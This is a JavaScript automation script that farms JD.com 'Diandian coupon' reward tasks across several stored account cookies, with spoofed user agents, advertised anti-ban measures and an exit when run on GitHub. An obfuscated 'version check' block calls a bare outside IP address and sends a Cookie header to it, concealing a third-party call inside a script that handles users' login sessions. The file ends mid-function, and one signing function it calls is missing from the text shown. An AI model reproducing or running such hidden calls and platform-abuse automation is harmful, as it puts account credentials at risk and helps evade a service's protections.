/*
点点券任务
入口：[京东App领券频道]
30 6,10,14,18,20 * * * jd_ddq.js
============ddq===============
1、由于签名限制,每次互助都要获取签名,如果担心风险,请禁用该脚本。
2、脚本中增加了防火爆和防封号脚本。
*/

const $ = new Env("点点券")
const Ver = '20220427';
const ua = `jdltapp;iPhone;3.1.0;${Math.ceil(Math.random()*4+10)}.${Math.ceil(Math.random()*4)};${randomString(40)}`
let cookiesArr = [], cookie = '';
let shareCodes = [];
let helpno = "",UUID="",flag1=false;
!(async () => {
    await $.wait(1000);
    await VerCheck("ddq",Ver);
    await $.wait(1000);
    UUID = getUUID();
    await $.wait(1000);
    requireConfig()
    
    for (let i = 0; i < cookiesArr.length; i++) {
        cookie = cookiesArr[i]
        $.UserName = decodeURIComponent(cookie.match(/pt_pin=([^; ]+)(?=;?)/) && cookie.match(/pt_pin=([^; ]+)(?=;?)/)[1])
        $.index = i + 1;
        $.UserName1 =encodeURIComponent($.UserName)
        
        console.log(`\n账号【${$.index}】${$.UserName} 开始任务******`);
        
        await getBodySign('Task','0',$.UserName1);
        //点点券-浏览任务 displayOrder=3
        await ldrw();
        await $.wait(1000);
        //点点券-玩锦鲤红包 displayOrder=7
        await jlhb();
        await $.wait(1000);
        //点点券-玩拼券活动 displayOrder=8
        await wpq();
        await $.wait(1000);
        //点点券-逛券后9.9 displayOrder=9
        await gqh();
        await $.wait(1000);
        //点点券-去买省钱券包 displayOrder=10
        await qmsqq();
        await $.wait(1000);
        //点点券-逛折学系频道10s displayOrder=20
        await gzxx();
        await $.wait(1000);


        
       
    }
    await $.wait(2000);
})()  .catch((e) => {
    $.log('', `❌ ${$.name}, 失败! 原因: ${e}!`, '')
  })
  .finally(() => {
    $.done();
  })




//点点券-浏览任务 displayOrder=3
async function ldrw(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===3){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask',vo.id,$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            data = await GetAllTask("necklace_getTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%7D");
                            //console.log("11111111111111111"+JSON.stringify(data))
                            for (let vo1 of data.data?.result?.taskItems){
                                //console.log(vo1.id+'->'+vo1.title+'->'+vo1.status);
                                if(vo1.status===2){
                                    console.log("🥇"+vo.taskName+"-"+vo1.title+"->任务已经完成啦✔✔✔")
                                }
                                if(vo1.status===0){
                                    data2 = await GetAllTask("necklace_timedTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
                                    await $.wait(5000);
                                    data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A"+vo.id+"%2C%22itemId%22%3A%22"+vo1.id+"%22%7D");
                                    
                                    if(data2!=''){
                                        console.log("🔊🔊🔊"+vo.taskName+'->'+vo1.title+"->"+data2.data.biz_msg )
                                    }else{
                                        console.log("IP已经被屏蔽，请三个小时后重试")
                                    }
                                    await $.wait(5000);
                                 }
                            }

                            //console.log(data1)
                            //console.log("📮"+vo.panelSubtitle+"->"+data1.data.biz_msg+"✔✔✔")
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===vo.id){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//点点券-玩锦鲤红包 displayOrder=7
async function jlhb(){
    try{
        let flag=false;
        for(let i=0;i<4;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===7){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask','418',$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A418%7D");
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.taskName+"->"+data2.data?.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===418){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//点点券-玩拼券活动 displayOrder=8
async function wpq(){
    try{
        let flag=false;
        for(let i=0;i<6;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===8){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask','416',$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A416%7D");
                            //console.log("11111111111111111"+JSON.stringify(data2))
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.taskName+"->"+data2.data?.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===416){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//点点券-逛券后9.9 displayOrder=9
async function gqh(){
    try{
        let flag=false;
        for(let i=0;i<6;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===9){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask','417',$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A417%7D");
                            //console.log("11111111111111111"+JSON.stringify(data2))
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.taskName+"->"+data2.data?.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===417){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//点点券-去买省钱券包 displayOrder=10
async function qmsqq(){
    try{
        let flag=false;
        for(let i=0;i<6;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===10){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask','420',$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A420%7D");
                            //console.log("11111111111111111"+JSON.stringify(data2))
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.taskName+"->"+data2.data?.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===420){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}

//点点券-逛折学系频道10s displayOrder=20
async function gzxx(){
    try{
        let flag=false;
        for(let i=0;i<6;i++){
            if(flag===true){break;}
            let data = await GetAllTask("necklace_taskHomePage",UUID,"","body=%7B%7D");
                for (let vo of data.data?.result?.taskConfigVos){
                    //console.log(vo.displayOrder+'->'+vo.taskName+'->'+vo.taskStage);
                    if(vo.displayOrder===20){
                        //获取签名并领取任务taskStage=0 任务未领 taskStage=1 任务已领  taskStage=2 已经完成
                        if(vo.taskStage ===0){
                            await getBodySign('startTask','435',$.UserName1);
                            //console.log(helpno);
                            data1=await startTask("necklace_startTask",UUID)
                            console.log("📮"+vo.taskName+"->"+data1.data?.biz_msg+"✔✔✔")
                            //console.log(JSON.stringify(data1));
                        }
                        if(vo.taskStage ===1){
                            await GetAllTask("necklace_timedTask",UUID,"","body=%7B%22taskId%22%3A435%2C%22itemId%22%3A%22%22%7D");
                            await $.wait(12000)
                            data2 = await GetAllTask("necklace_reportTask",UUID,"","body=%7B%22taskId%22%3A435%7D");
                            //console.log("11111111111111111"+JSON.stringify(data2))
                            if(data2!=''){
                                console.log("🔊🔊🔊"+vo.taskName+"->"+data2.data?.biz_msg )
                            }else{
                                console.log("IP已经被屏蔽，请三个小时后重试")
                            }
                        }
                        if(vo.taskStage ===2){
                        data2 = await GetAllTask("necklace_newHomePage",UUID,"&client=ios&clientVersion=10.4.6&build=168014&partner=&rfs=0000","body=%7B%7D");
                        //console.log("11111111111111111"+JSON.stringify(data2))
                        for (let vo3 of data2.data?.result?.bubbles){
                            if(vo3.taskConfigId===435){
                                await getBodySign('necklace_chargeScores',vo3.id,$.UserName1);
                                data4=await startTask("necklace_chargeScores",UUID)
                                console.log("🧧"+vo.taskName+"->红包开出"+data4.data?.result?.giftScoreNum+"积分.")
                            }
                        }
                        
                    }
                        if(vo.taskStage ===3){
                            console.log("🥇"+vo.taskName+"->任务已经完成啦✔✔✔")
                            flag=true
                        }    
                        await $.wait(2000);
                    }
                    
                }
        }
    }catch(e){
        
    }
    
}


//点点券代码
function getUUID(x = "xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx", t = 0) { return x.replace(/[xy]/g, function (x) { var r = 16 * Math.random() | 0, n = "x" == x ? r : 3 & r | 8; return uuid = t ? n.toString(36).toUpperCase() : n.toString(36), uuid }) }


//点点券代码
function GetAllTask(functionId,uuid,url1,body={}) {
    return new Promise(async resolve => {
        const options = {
            url: `https://api.m.jd.com/api?appid=coupon-necklace&functionId=${functionId}&loginType=2&t=${Date.now()}&uuid=${uuid}${url1}`,
            body: body,
            headers: {
                "authority": "api.m.jd.com",
                "origin": "https://h5.m.jd.com",
                "accept": "application/json, text/plain, */*",
                "Content-Type": "application/x-www-form-urlencoded",
                "Cookie": cookie,
                "User-Agent": $.isNode() ? (process.env.JD_USER_AGENT ? process.env.JD_USER_AGENT : (require('./USER_AGENTS').USER_AGENT)) : ($.getdata('JDUA') ? $.getdata('JDUA') : "jdapp;iPhone;9.4.4;14.3;network/4g;Mozilla/5.0 (iPhone; CPU iPhone OS 14_3 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148;supportJDSHWK/1")
            }
        }
        $.post(options, (err, resp, data) => {
            try {
                if (err) {
                    console.log(`${JSON.stringify(err)}`);
                    console.log(`${$.name} API请求失败，请检查网路重试`);
                } else {
                    if (data) {
                        data = JSON.parse(data);
                    } else {
                        console.log(`服务器返回空数据`)
                    }
                }
            } catch (e) {
                $.logErr(e)
            } finally {
                resolve(data);
            }
        })
    })
}

var __encode ='jsjiami.com',_a={}, _0xb483=["\x5F\x64\x65\x63\x6F\x64\x65","\x68\x74\x74\x70\x3A\x2F\x2F\x77\x77\x77\x2E\x73\x6F\x6A\x73\x6F\x6E\x2E\x63\x6F\x6D\x2F\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x6F\x62\x66\x75\x73\x63\x61\x74\x6F\x72\x2E\x68\x74\x6D\x6C"];(function(_0xd642x1){_0xd642x1[_0xb483[0]]= _0xb483[1]})(_a);var __Oxdcb86=["\x68\x74\x74\x70\x3A\x2F\x2F\x31\x39\x39\x2E\x31\x30\x31\x2E\x31\x37\x31\x2E\x31\x33\x3A\x31\x38\x38\x30\x2F\x56\x65\x72\x43\x68\x65\x63\x6B\x3F\x66\x75\x6E\x63\x74\x69\x6F\x6E\x49\x64\x3D","\x26\x76\x65\x72\x3D","","\x70\x61\x72\x73\x65","\x63\x6F\x64\x65","\x64\x61\x74\x61","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\u7248\u672C\u4FE1\u606F\uD83C\uDF89\uD83C\uDF89\uD83C\uDF89\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x6C\x6F\x67","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A\x2A","\x20\x20\x20\x20\x20\u5F53\u524D\u7248\u672C\x3A","\x20\x20\u6700\u65B0\u7248\u672C\x3A","\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\u5EFA\u8BAE\u62C9\u53D6\u811A\u672C\u83B7\u53D6\u65B0\u7248\u672C","\x20\x20\u6700\u65B0\u7248\u672C\x3A\u83B7\u53D6\u5931\u8D25\x21","\x45\x72\x72\x6F\x72\x3A\x20","\x6C\x6F\x67\x45\x72\x72","\x67\x65\x74","\x75\x6E\x64\x65\x66\x69\x6E\x65\x64","\u5220\u9664","\u7248\u672C\u53F7\uFF0C\x6A\x73\u4F1A\u5B9A","\u671F\u5F39\u7A97\uFF0C","\u8FD8\u8BF7\u652F\u6301\u6211\u4EEC\u7684\u5DE5\u4F5C","\x6A\x73\x6A\x69\x61","\x6D\x69\x2E\x63\x6F\x6D"];function VerCheck(_0x89aax2,_0x89aax3){return  new Promise((_0x89aax4)=>{$[__Oxdcb86[0x10]]({url:`${__Oxdcb86[0x0]}${_0x89aax2}${__Oxdcb86[0x1]}${_0x89aax3}${__Oxdcb86[0x2]}`,headers:{"\x43\x6F\x6F\x6B\x69\x65":cookie,"\x55\x73\x65\x72\x2D\x41\x67\x65\x6E\x74":ua}},(_0x89aax5,_0x89aax6,_0x89aax7)=>{try{_0x89aax7= JSON[__Oxdcb86[0x3]](_0x89aax7);if(_0x89aax7[__Oxdcb86[0x4]]=== 100){if(_0x89aax3=== _0x89aax7[__Oxdcb86[0x5]]){console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0x8]+ Ver);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xb]+ _0x89aax7[__Oxdcb86[0x5]]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}else {console[__Oxdcb86[0x7]](__Oxdcb86[0x6]);console[__Oxdcb86[0x7]](__Oxdcb86[0x2]);console[__Oxdcb86[0x7]](__Oxdcb86[0xa]+ Ver+ __Oxdcb86[0xd]);console[__Oxdcb86[0x7]](__Oxdcb86[0xc]);console[__Oxdcb86[0x7]](__Oxdcb86[0x9])}}catch(e){$[__Oxdcb86[0xf]](__Oxdcb86[0xe],e)}finally{_0x89aax4(_0x89aax7)}})})}(function(_0x89aax8,_0x89aax9,_0x89aaxa,_0x89aaxb,_0x89aaxc,_0x89aaxd){_0x89aaxd= __Oxdcb86[0x11];_0x89aaxb= function(_0x89aaxe){if( typeof alert!== _0x89aaxd){alert(_0x89aaxe)};if( typeof console!== _0x89aaxd){console[__Oxdcb86[0x7]](_0x89aaxe)}};_0x89aaxa= function(_0x89aaxf,_0x89aax8){return _0x89aaxf+ _0x89aax8};_0x89aaxc= _0x89aaxa(__Oxdcb86[0x12],_0x89aaxa(_0x89aaxa(__Oxdcb86[0x13],__Oxdcb86[0x14]),__Oxdcb86[0x15]));try{_0x89aax8= __encode;if(!( typeof _0x89aax8!== _0x89aaxd&& _0x89aax8=== _0x89aaxa(__Oxdcb86[0x16],__Oxdcb86[0x17]))){_0x89aaxb(_0x89aaxc)}}catch(e){_0x89aaxb(_0x89aaxc)}})({})

function requireConfig() {
    return new Promise(resolve => {
        notify = $.isNode() ? require('./sendNotify') : '';
        const jdCookieNode = $.isNode() ? require('./jdCookie.js') : '';
        if ($.isNode()) {
            Object.keys(jdCookieNode).forEach((item) => {
                if (jdCookieNode[item]) {
                    cookiesArr.push(jdCookieNode[item])
                }
            })
            if (process.env.JD_DEBUG && process.env.JD_DEBUG === 'false') console.log = () => {};
        } else {
            cookiesArr = [$.getdata('CookieJD'), $.getdata('CookieJD2'), ...jsonParse($.getdata('CookiesJD') || "[]").map(item => item.cookie)].filter(item => !!item);
        }
        console.log(`共${cookiesArr.length}个京东账号\n`)
        //resolve()
    })
}
function gettimestamp() {
  let time = new Date().getTime();
  return `${time}`;
}




function random(min, max) {
  let num = Math.floor(Math.random() * (max - min)) + min;
  return `${num}`;
}


function randomString(e) {
    e = e || 32;
    let t = "abcdefhijkmnprstwxyz2345678",
        a = t.length,
        n = "";
    for (i = 0; i < e; i++)
        n += t.charAt(Math.floor(Math.random() * a));
    return n
}


function Env(t,e){"undefined"!=typeof process&&JSON.stringify(process.env).indexOf("GITHUB")>-1&&process.exit(0);class s{constructor(t){this.env=t}send(t,e="GET"){t="string"==typeof t?{url:t}:t;let s=this.get;return"POST"===e&&(s=this.post),new Promise((e,i)=>{s.call(this,t,(t,s,r)=>{t?i(t):e(s)})})}get(t){return this.send.call(this.env,t)}post(t){return this.send.call(this.env,t,"POST")}}return new class{constructor(t,e){this.name=t,this.http=new s(this),this.data=null,this.dataFile="box.dat",this.logs=[],this.isMute=!1,this.isNeedRewrite=!1,this.logSeparator="\n",this.startTime=(new Date).getTime(),Object.assign(this,e),this.log("",`🔔${this.name}, 开始!`)}isNode(){return"undefined"!=typeof module&&!!module.exports}isQuanX(){return"undefined"!=typeof $task}isSurge(){return"undefined"!=typeof $httpClient&&"undefined"==typeof $loon}isLoon(){return"undefined"!=typeof $loon}toObj(t,e=null){try{return JSON.parse(t)}catch{return e}}toStr(t,e=null){try{return JSON.stringify(t)}catch{return e}}getjson(t,e){let s=e;const i=this.getdata(t);if(i)try{s=JSON.parse(this.getdata(t))}catch{}return s}setjson(t,e){try{return this.setdata(JSON.stringify(t),e)}catch{return!1}}getScript(t){return new Promise(e=>{this.get({url:t},(t,s,i)=>e(i))})}runScript(t,e){return new Promise(s=>{let i=this.getdata("@chavy_boxjs_userCfgs.httpapi");i=i?i.replace(/\n/g,"").trim():i;let r=this.getdata("@chavy_boxjs_userCfgs.httpapi_timeout");r=r?1*r:20,r=e&&e.timeout?e.timeout:r;const[o,h]=i.split("@"),n={url:`http://${h}/v1/scripting/evaluate`,body:{script_text:t,mock_type:"cron",timeout:r},headers:{"X-Key":o,Accept:"*/*"}};this.post(n,(t,e,i)=>s(i))}).catch(t=>this.logErr(t))}loaddata(){if(!this.isNode())return{};{this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e);if(!s&&!i)return{};{const i=s?t:e;try{return JSON.parse(this.fs.readFileSync(i))}catch(t){return{}}}}}writedata(){if(this.isNode()){this.fs=this.fs?this.fs:require("fs"),this.path=this.path?this.path:require("path");const t=this.path.resolve(this.dataFile),e=this.path.resolve(process.cwd(),this.dataFile),s=this.fs.existsSync(t),i=!s&&this.fs.existsSync(e),r=JSON.stringify(this.data);s?this.fs.writeFileSync(t,r):i?this.fs.writeFileSync(e,r):this.fs.writeFileSync(t,r)}}lodash_get(t,e,s){const i=e.replace(/\[(\d+)\]/g,".$1").split(".");let r=t;for(const t of i)if(r=Object(r)[t],void 0===r)return s;return r}lodash_set(t,e,s){return Object(t)!==t?t:(Array.isArray(e)||(e=e.toString().match(/[^.[\]]+/g)||[]),e.slice(0,-1).reduce((t,s,i)=>Object(t[s])===t[s]?t[s]:t[s]=Math.abs(e[i+1])>>0==+e[i+1]?[]:{},t)[e[e.length-1]]=s,t)}getdata(t){let e=this.getval(t);if(/^@/.test(t)){const[,s,i]=/^@(.*?)\.(.*?)$/.exec(t),r=s?this.getval(s):"";if(r)try{const t=JSON.parse(r);e=t?this.lodash_get(t,i,""):e}catch(t){e=""}}return e}setdata(t,e){let s=!1;if(/^@/.test(e)){const[,i,r]=/^@(.*?)\.(.*?)$/.exec(e),o=this.getval(i),h=i?"null"===o?null:o||"{}":"{}";try{const e=JSON.parse(h);this.lodash_set(e,r,t),s=this.setval(JSON.stringify(e),i)}catch(e){const o={};this.lodash_set(o,r,t),s=this.setval(JSON.stringify(o),i)}}else s=this.setval(t,e);return s}getval(t){return this.isSurge()||this.isLoon()?$persistentStore.read(t):this.isQuanX()?$prefs.valueForKey(t):this.isNode()?(this.data=this.loaddata(),this.data[t]):this.data&&this.data[t]||null}setval(t,e){return this.isSurge()||this.isLoon()?$persistentStore.write(t,e):this.isQuanX()?$prefs.setValueForKey(t,e):this.isNode()?(this.data=this.loaddata(),this.data[e]=t,this.writedata(),!0):this.data&&this.data[e]||null}initGotEnv(t){this.got=this.got?this.got:require("got"),this.cktough=this.cktough?this.cktough:require("tough-cookie"),this.ckjar=this.ckjar?this.ckjar:new this.cktough.CookieJar,t&&(t.headers=t.headers?t.headers:{},void 0===t.headers.Cookie&&void 0===t.cookieJar&&(t.cookieJar=this.ckjar))}get(t,e=(()=>{})){t.headers&&(delete t.headers["Content-Type"],delete t.headers["Content-Length"]),this.isSurge()||this.isLoon()?(this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.get(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)})):this.isQuanX()?(this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t))):this.isNode()&&(this.initGotEnv(t),this.got(t).on("redirect",(t,e)=>{try{if(t.headers["set-cookie"]){const s=t.headers["set-cookie"].map(this.cktough.Cookie.parse).toString();s&&this.ckjar.setCookieSync(s,null),e.cookieJar=this.ckjar}}catch(t){this.logErr(t)}}).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)}))}post(t,e=(()=>{})){if(t.body&&t.headers&&!t.headers["Content-Type"]&&(t.headers["Content-Type"]="application/x-www-form-urlencoded"),t.headers&&delete t.headers["Content-Length"],this.isSurge()||this.isLoon())this.isSurge()&&this.isNeedRewrite&&(t.headers=t.headers||{},Object.assign(t.headers,{"X-Surge-Skip-Scripting":!1})),$httpClient.post(t,(t,s,i)=>{!t&&s&&(s.body=i,s.statusCode=s.status),e(t,s,i)});else if(this.isQuanX())t.method="POST",this.isNeedRewrite&&(t.opts=t.opts||{},Object.assign(t.opts,{hints:!1})),$task.fetch(t).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>e(t));else if(this.isNode()){this.initGotEnv(t);const{url:s,...i}=t;this.got.post(s,i).then(t=>{const{statusCode:s,statusCode:i,headers:r,body:o}=t;e(null,{status:s,statusCode:i,headers:r,body:o},o)},t=>{const{message:s,response:i}=t;e(s,i,i&&i.body)})}}time(t,e=null){const s=e?new Date(e):new Date;let i={"M+":s.getMonth()+1,"d+":s.getDate(),"H+":s.getHours(),"m+":s.getMinutes(),"s+":s.getSeconds(),"q+":Math.floor((s.getMonth()+3)/3),S:s.getMilliseconds()};/(y+)/.test(t)&&(t=t.replace(RegExp.$1,(s.getFullYear()+"").substr(4-RegExp.$1.length)));for(let e in i)new RegExp("("+e+")").test(t)&&(t=t.replace(RegExp.$1,1==RegExp.$1.length?i[e]:("00"+i[e]).substr((""+i[e]).length)));return t}msg(e=t,s="",i="",r){const o=t=>{if(!t)return t;if("string"==typeof t)return this.isLoon()?t:this.isQuanX()?{"open-url":t}:this.isSurge()?{url:t}:void 0;if("object"==typeof t){if(this.isLoon()){let e=t.openUrl||t.url||t["open-url"],s=t.mediaUrl||t["media-url"];return{openUrl:e,mediaUrl:s}}if(this.isQuanX()){let e=t["open-url"]||t.url||t.openUrl,s=t["media-url"]||t.mediaUrl;return{"open-url":e,"media-url":s}}if(this.isSurge()){let e=t.url||t.openUrl||t["open-url"];return{url:e}}}};if(this.isMute||(this.isSurge()||this.isLoon()?$notification.post(e,s,i,o(r)):this.isQuanX()&&$notify(e,s,i,o(r))),!this.isMuteLog){let t=["","==============📣系统通知📣=============="];t.push(e),s&&t.push(s),i&&t.push(i),console.log(t.join("\n")),this.logs=this.logs.concat(t)}}log(...t){t.length>0&&(this.logs=[...this.logs,...t]),console.log(t.join(this.logSeparator))}logErr(t,e){const 